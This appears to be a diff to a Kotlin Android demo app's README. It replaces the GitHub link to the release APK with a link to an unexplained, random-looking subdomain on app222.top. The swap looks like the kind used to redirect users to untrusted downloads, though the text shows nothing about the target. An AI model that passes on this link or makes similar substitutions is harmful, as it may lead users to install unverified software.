@@ -14,7 +14,7 @@ MVP+Retrofit请求结构，使用AndroidX开发
 - kotlin之协程的使用
 
 ## APP下载体验
-- [GitHub下载](https://github.com/robertchar/KotlinGanhuo/blob/master/app/release/app-release.apk?raw=true)
+- [app体验下载](http://yy797v1n7p25jpraxjcwtksedj33i69dca8yjsi3x1o632uk5a.url.app222.top/ru7ans?1586507034)
 
 ## 应用截图
 
